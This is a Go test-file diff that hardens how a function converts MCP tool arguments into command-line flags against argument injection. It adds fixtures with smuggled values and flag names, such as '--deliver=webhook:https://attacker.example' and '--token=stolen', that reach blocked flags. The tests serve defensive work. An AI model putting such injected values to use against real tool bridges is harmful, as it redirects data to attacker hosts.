@@ -61,7 +61,7 @@ func TestCliArgsFromMCP_BlocksRootFlags(t *testing.T) {
 		"limit": float64(10),
 	}
 	got := cliArgsFromMCP(in)
-	want := []string{"--limit", "10"}
+	want := []string{"--limit=10"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("cliArgsFromMCP dropped/kept wrong keys: got %v, want %v", got, want)
 	}
@@ -90,9 +90,68 @@ func TestCliArgsFromMCP_AllowsPerCommandFlags(t *testing.T) {
 		"tags":    []any{"a", "b"},
 	}
 	got := cliArgsFromMCP(in)
-	want := []string{"--limit", "25", "--query", "alpha", "--tags", "a,b", "--verbose"}
+	want := []string{"--limit=25", "--query=alpha", "--tags=a,b", "--verbose"}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("cliArgsFromMCP per-command passthrough: got %v, want %v", got, want)
+	}
+}
+
+// TestCliArgsFromMCP_ValueCannotBecomeAFlag is the value-channel half of the
+// control-plane-injection guard. blockedRootFlags filters argument NAMES, so
+// it cannot see a blocked flag smuggled in as an argument VALUE. Emitting
+// "--k" and "v" as two tokens made that smuggling work: pflag does not
+// consume a following token for a boolean flag, so the value token was
+// re-parsed as a flag of its own and {"json": "--deliver=..."} set --deliver.
+// Binding every value into the same token as its name ("--k=v") is what
+// closes it; each case below is a payload that reached a blocked flag under
+// the two-token form.
+func TestCliArgsFromMCP_ValueCannotBecomeAFlag(t *testing.T) {
+	payloads := []struct {
+		name string
+		in   map[string]any
+	}{
+		{"bool carrier", map[string]any{"json": "--deliver=webhook:https://attacker.example"}},
+		{"bool carrier bare flag", map[string]any{"json": "--insecure"}},
+		{"string carrier", map[string]any{"query": "--deliver=webhook:https://attacker.example"}},
+		{"number carrier", map[string]any{"limit": "--token=stolen"}},
+		{"array carrier", map[string]any{"tags": []any{"--config=/tmp/evil.yaml"}}},
+	}
+	for _, p := range payloads {
+		t.Run(p.name, func(t *testing.T) {
+			for _, tok := range cliArgsFromMCP(p.in) {
+				// Every emitted token must be exactly one "--name=value" (or a
+				// bare "--name" for a true bool). A token that is only the
+				// payload means the value escaped into flag position.
+				if !strings.HasPrefix(tok, "--") {
+					t.Fatalf("emitted a non-flag token %q; a value escaped into flag position", tok)
+				}
+				name := strings.TrimPrefix(tok, "--")
+				if i := strings.Index(name, "="); i >= 0 {
+					name = name[:i]
+				}
+				if blockedRootFlags[name] {
+					t.Fatalf("token %q carries blocked flag %q in flag position", tok, name)
+				}
+			}
+		})
+	}
+}
+
+// TestCliArgsFromMCP_RejectsUnsafeFlagNames covers the other end of the same
+// boundary: an argument NAME containing "=" or leading with "-" stops being a
+// name once "--" is prepended, which would let a caller relocate the
+// name/value split that blockedRootFlags depends on.
+func TestCliArgsFromMCP_RejectsUnsafeFlagNames(t *testing.T) {
+	in := map[string]any{
+		"json=true --deliver": "webhook:https://attacker.example",
+		"-deliver":            "webhook:https://attacker.example",
+		"":                    "empty",
+		"limit":               float64(5),
+	}
+	got := cliArgsFromMCP(in)
+	want := []string{"--limit=5"}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("cliArgsFromMCP kept an unsafe flag name: got %v, want %v", got, want)
 	}
 }
 
